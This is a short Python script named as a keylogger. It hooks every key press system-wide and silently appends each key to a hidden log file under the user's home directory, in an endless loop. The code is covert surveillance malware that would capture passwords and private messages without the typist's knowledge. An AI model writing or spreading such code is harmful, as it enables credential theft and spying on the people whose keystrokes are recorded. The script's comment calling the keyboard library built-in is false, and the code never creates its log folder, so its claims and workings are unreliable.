import keyboard  # This is built-in on many systems
import time
import os

log_file = os.path.expanduser("~/.keylogger/keys.log")

def on_key_press(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

while True:
    keyboard.on_press(on_key_press)
    keyboard.wait()